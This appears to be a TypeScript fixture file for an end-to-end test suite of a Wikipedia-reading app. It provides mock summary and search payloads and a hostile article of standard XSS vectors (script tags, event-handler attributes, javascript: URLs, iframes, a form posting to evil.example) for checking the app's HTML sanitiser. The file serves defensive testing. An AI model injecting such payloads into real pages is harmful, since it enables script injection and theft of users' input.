/*
  Payloads for the interception layer. Shapes match what the app actually
  narrows in src/lib/wikipedia/article.ts — `type: "standard"`, a numeric
  `pageid`, and `content_urls.desktop.page`, all of which toArticle() requires
  before it will return an Article at all.
*/

export interface SummaryOptions {
  id: number;
  title: string;
}

export function summary({ id, title }: SummaryOptions): unknown {
  return {
    type: "standard",
    pageid: id,
    title,
    extract: `${title} is a fixture article used by the end-to-end suite.`,
    timestamp: "2026-01-15T10:30:00Z",
    thumbnail: {
      source: `https://upload.wikimedia.org/fixture/${id}.png`,
      width: 320,
      height: 240,
    },
    content_urls: {
      desktop: { page: `https://en.wikipedia.org/wiki/${encodeURIComponent(title)}` },
    },
  };
}

export function searchResults(titles: readonly string[]): unknown {
  return {
    query: {
      search: titles.map((title, index) => ({ pageid: 9000 + index, title })),
    },
  };
}

export function related(titles: readonly string[]): unknown {
  return { pages: titles.map((title, index) => summary({ id: 7000 + index, title })) };
}

/*
  The hostile article.

  Every payload below is one a sanitiser is supposed to stop, and each writes a
  distinct value to window.__pwned so a failure says *which* defence gave way
  rather than just that one did. Nothing here is exotic: these are the standard
  vectors, and the point is that they travel the real path — fetched over the
  network, through sanitizeArticleHtml, into a live document — rather than being
  asserted against a returned string.

  The legitimate content around them is not filler. It is what proves the
  sanitiser strips the attacks without also stripping the article, which a
  sanitiser that simply returned "" would otherwise pass.
*/
export const HOSTILE_ARTICLE_HTML = `<!DOCTYPE html>
<html><head>
  <base href="https://evil.example/">
  <script>window.__pwned = "head-script";</script>
</head>
<body>
  <section>
    <h2 id="overview">Overview</h2>
    <p>Legitimate paragraph text that must survive sanitisation.</p>

    <script>window.__pwned = "body-script";</script>
    <img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onerror="window.__pwned = 'img-onerror'" alt="probe">
    <a href="javascript:window.__pwned = 'js-url'">javascript url</a>
    <a href="/wiki/Fixture_Target">internal wiki link</a>
    <a href="https://example.com/external">external link</a>
    <iframe src="https://evil.example/frame"></iframe>
    <object data="https://evil.example/object"></object>
    <form action="https://evil.example/collect"><input name="stolen"></form>
    <div style="position:fixed;inset:0;z-index:99999;background:red">clickjacking overlay</div>
    <svg onload="window.__pwned = 'svg-onload'"><circle r="10"></circle></svg>
    <p onmouseover="window.__pwned = 'onmouseover'">hover probe</p>

    <ul><li>First list item</li><li>Second list item</li></ul>
    <h3 id="details">Details</h3>
    <p>A second legitimate paragraph, after the payloads.</p>
  </section>
</body></html>`;

/** 1×1 transparent PNG, so thumbnails resolve without leaving the fixtures. */
export const PIXEL_PNG = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==",
  "base64",
);
